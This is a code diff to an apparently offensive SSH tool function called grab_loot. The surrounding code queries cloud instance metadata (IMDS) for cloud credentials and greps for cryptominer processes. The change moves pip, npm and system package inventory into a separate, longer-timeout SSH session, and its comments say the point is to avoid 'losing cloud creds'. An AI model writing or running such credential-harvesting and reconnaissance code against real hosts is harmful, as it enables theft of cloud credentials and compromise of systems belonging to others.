@@ -552,15 +552,16 @@ def grab_loot(
             "ps aux 2>/dev/null | grep -iE 'xmrig|kdevtmpfsi|kinsing|"
             "kthrotlds|sysupdate|sysguard|networkservice' | grep -v grep || true"
         )
-        # Package inventory: pip, npm, and system packages. Each is
-        # best-effort (fails silently when the package manager is absent).
-        imds_script += (
-            "\necho '---pip_packages---'; "
-            "pip list --format=json 2>/dev/null || true"
-            "\necho '---npm_packages---'; "
-            "npm list -g --json 2>/dev/null || true"
+        # Package inventory is split into a separate SSH exec call with a
+        # longer timeout. pip list / npm list / dpkg-query can take 10-30s on
+        # hosts with many packages — combining them with IMDS in one call
+        # risks the IMDS data timing out and losing cloud creds.
+        pkg_script = (
+            "echo '---pip_packages---'; pip list --format=json 2>/dev/null || true"
+            "\necho '---npm_packages---'; npm list -g --json 2>/dev/null || true"
             "\necho '---system_packages---'; "
-            "dpkg-query -W -f '${Package}\\t${Version}\\n' 2>/dev/null || rpm -qa --qf '%{NAME}\\t%{VERSION}\\n' 2>/dev/null || true"
+            "dpkg-query -W -f '${Package}\\t${Version}\\n' 2>/dev/null "
+            "|| rpm -qa --qf '%{NAME}\\t%{VERSION}\\n' 2>/dev/null || true"
         )
         chan.exec_command(imds_script)
         out = b""
@@ -596,6 +597,55 @@ def grab_loot(
             chan.close()
         except Exception:
             pass
+
+        # 5. Package inventory — separate exec call with a longer timeout.
+        # Package managers can be slow (30s+ on hosts with many packages), so
+        # this runs after IMDS/cloud-cred data is safely collected. A timeout
+        # here only loses package data, not cloud creds.
+        pkg_timeout = timeout_s * 2  # double timeout for package listing
+        try:
+            pkg_chan = transport.open_session()
+            pkg_chan.settimeout(pkg_timeout)
+            pkg_chan.exec_command(pkg_script)
+            pkg_out = b""
+            pkg_deadline = time.monotonic() + pkg_timeout
+            while True:
+                got = False
+                if pkg_chan.recv_ready():
+                    pkg_out += pkg_chan.recv(4096)
+                    got = True
+                if pkg_chan.recv_stderr_ready():
+                    pkg_chan.recv_stderr(4096)
+                    got = True
+                if (pkg_chan.exit_status_ready()
+                        and not pkg_chan.recv_ready()
+                        and not pkg_chan.recv_stderr_ready()):
+                    break
+                if not got and time.monotonic() > pkg_deadline:
+                    break
+                if not got:
+                    time.sleep(0.02)
+            pkg_text = pkg_out.decode("utf-8", "replace")
+            pkg_sections: dict[str, str] = {}
+            current = ""
+            buf: list[str] = []
+            for line in pkg_text.splitlines():
+                if line.startswith("---") and line.endswith("---"):
+                    if current:
+                        pkg_sections[current] = "\n".join(buf)
+                    current = line[3:-3]
+                    buf = []
+                else:
+                    buf.append(line)
+            if current:
+                pkg_sections[current] = "\n".join(buf)
+            _parse_packages(pkg_sections, res)
+            try:
+                pkg_chan.close()
+            except Exception:
+                pass
+        except Exception:
+            pass  # Package inventory is best-effort — never fail the loot grab
 
     except paramiko.AuthenticationException as exc:
         res.error = f"auth failed: {exc!r}"
